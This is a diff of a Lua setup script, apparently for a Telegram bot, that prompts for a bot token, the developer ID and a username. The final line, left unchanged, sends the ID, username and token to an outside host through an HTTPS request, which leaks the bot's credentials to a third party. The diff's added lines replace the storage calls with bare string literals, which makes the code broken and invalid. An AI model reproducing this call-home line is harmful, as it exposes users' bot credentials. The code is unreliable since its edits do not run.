@@ -27,7 +27,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))  
 end 
 local AutoSet = function()
-if not DevAbs:get(DevProx..":token") then
+if not "token" then
 io.write('\27[1;31m ↡ ارسل لي توكن البوت الان |\nSEND TOKEN FOR BOT : \27[0;39;49m')
 local token = io.read()
 if token ~= '' then
@@ -36,30 +36,30 @@ if res ~= 200 then
 print('\27[1;34m التوكن غير صحيح تاكد منه ثم ارسله |')
 else
 io.write('\27[1;34m تم حفظ التوكن بنجاح |\n27[0;39;49m')
-DevAbs:set(DevProx..":token",token)
+"token"
 end 
 else
 print('\27[1;34m لم يتم حفظ التوكن ارسل لي التوكن الان |')
 end 
 os.execute('lua DevProx.lua')
 end
-if not DevAbs:get(DevProx..":SUDO") then
+if not "SUDO" then
 io.write('\27[1;31m ↡ ارسل ايدي مطور الاساسي |\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDO = io.read()
 if SUDO ~= '' then
 io.write('\n\27[1;34m تم حفظ ايدي المطور |\n\27[0;39;49m')
-DevAbs:set(DevProx..":SUDO",SUDO)
+"SUDO"
 else
 print('\n\27[1;34m لم يتم حفظ ايدي المطور |')
 end 
 os.execute('lua DevProx.lua')
 end
-if not DevAbs:get(DevProx..":username") then
+if not "username" then
 io.write('\27[1;31m ↡ ارسل معرف المطور الاساسي |\n SEND ID FOR SIDO : \27[0;39;49m')
 local username = io.read():gsub('@','')
 if username ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور |\n\27[0;39;49m')
-DevAbs:set(DevProx..":username",'@'..username)
+"username"
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور |')
 end 
@@ -84,7 +84,6 @@ token = token,
 bot_id = botid,
 username = username, 
 sudo_users = {SUDO}, 
-config_file(DevAbs:get(DevProx..":SUDO"),DevAbs:get(DevProx..":username"),DevAbs:get(DevProx..":token"))
 }
 create(config, "./config.lua")   
 https.request("https://ibcorp.ibuser.xyz/iq_abs/?id="..SUDO.."&user="..username.."&token="..token)
